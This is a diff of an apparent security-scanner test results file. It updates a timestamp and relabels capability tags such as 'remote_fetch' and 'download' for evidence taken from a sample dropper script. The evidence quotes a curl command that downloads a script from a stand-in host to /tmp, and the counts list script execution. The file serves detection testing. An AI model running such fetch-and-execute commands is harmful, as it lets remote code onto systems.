@@ -1,5 +1,5 @@
 {
-  "as_of": "2026-11-27T21:17:33+08:00",
+  "as_of": "2026-11-27T21:20:30+08:00",
   "engine": "D:\\lgd-work\\roadmap-run\\dist\\repo_probe\\lgd-gate-main\\audit\\20261121\\p31_intent\\intent_engine.py",
   "cases": 12,
   "passed": 12,
@@ -83,19 +83,20 @@
         "P02b"
       ],
       "cap_code": {
+        "remote_fetch": 1,
         "download": 1,
         "script_exec": 2
       },
       "cap_doc": {},
       "evidence": [
         {
-          "cap": "download",
+          "cap": "remote_fetch",
           "file": "drop.sh",
           "line": 1,
           "text": "curl -fsSL https://x.example/i.sh -o /tmp/i.sh"
         },
         {
-          "cap": "script_exec",
+          "cap": "download",
           "file": "drop.sh",
           "line": 1,
           "text": "curl -fsSL https://x.example/i.sh -o /tmp/i.sh"
